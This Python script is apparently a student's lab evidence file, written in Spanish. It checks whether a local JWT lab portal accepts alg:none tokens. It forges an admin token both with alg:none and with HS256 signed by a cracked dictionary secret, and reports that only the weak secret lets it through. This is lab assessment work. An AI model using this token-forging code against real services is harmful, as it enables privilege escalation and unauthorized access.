#!/usr/bin/env python3
"""P4 — ¿este portal acepta un token con alg:none? (Lab Extra 5 · Grupo 07 · Lautaro)

Levanta el portal objetivo en un puerto local, forja un token con el header
{"alg":"none"} y firma vacía (role=admin, sub=diego) y lo manda a /admin y /perfil.
Para contraste, repite con un token HS256 firmado con el secreto crackeado (mate123).
No lee solucion.md ni el generador: solo observa respuestas HTTP.

Uso, desde la raíz del repo:
    python3 entregas/labextra5/grupo07/evidencia/prueba_alg_none.py
"""
import base64
import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

PORT = int(os.environ.get("PORT", "8097"))
SERVER = "labs/labextra5-jwt/objetivo/server.py"
B = f"http://127.0.0.1:{PORT}"


def b64url(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def unpad(x: str) -> str:
    return x + "=" * (-len(x) % 4)


def get(path, token=None):
    req = urllib.request.Request(B + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=4) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main() -> int:
    if not os.path.exists(SERVER):
        sys.exit(f"Corré desde la raíz del repo (no encuentro {SERVER})")
    env = {**os.environ, "PORT": str(PORT)}
    srv = subprocess.Popen([sys.executable, "-I", SERVER], env=env,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(1.5)
        st, body = get("/login?user=diego&pass=diego123")
        print(f"[login diego]                 {st}")
        tok = json.loads(body)["token"]
        _, pay, _ = tok.split(".")
        payload = json.loads(base64.urlsafe_b64decode(unpad(pay)).decode())
        payload["role"] = "admin"
        payload["sub"] = "diego"

        # 1) alg:none, firma vacía
        hdr_none = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        pl = b64url(json.dumps(payload).encode())
        none_tok = f"{hdr_none}.{pl}."
        print(f"[alg:none role=admin -> /admin]   {get('/admin', none_tok)[0]}   (esperado: 401, rechazado)")
        print(f"[alg:none role=admin -> /perfil]  {get('/perfil', none_tok)[0]}   (esperado: 401, rechazado)")

        # 2) contraste: HS256 firmado con el secreto crackeado
        hdr_hs = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        sig = b64url(hmac.new(b"mate123", f"{hdr_hs}.{pl}".encode(), hashlib.sha256).digest())
        st2, body2 = get("/admin", f"{hdr_hs}.{pl}.{sig}")
        print(f"[HS256+mate123 role=admin -> /admin]  {st2}   {body2[:80]}")
        print("\nConclusión: el portal IGNORA el header alg y siempre verifica HMAC-SHA256")
        print("con el secreto; la firma vacía de alg:none no coincide -> 401. No es vulnerable")
        print("a alg:none. Su falla real es el secreto de diccionario (mate123).")
        return 0
    finally:
        srv.terminate()


if __name__ == "__main__":
    raise SystemExit(main())
